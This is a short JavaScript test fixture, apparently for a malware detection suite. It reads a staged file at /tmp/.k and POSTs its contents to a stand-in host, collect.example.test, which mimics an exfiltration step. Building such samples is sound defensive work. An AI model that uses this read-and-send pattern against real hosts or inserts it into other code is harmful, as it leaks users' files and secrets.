// FIXTURE ONLY — synthetic detection test sample, not real malware
// Inert sample: sends the file the shell step staged (non-existent .test domain).
const fs = require("fs");

fetch("https://collect.example.test/k", {
  method: "POST",
  body: fs.readFileSync("/tmp/.k", "utf8"),
});
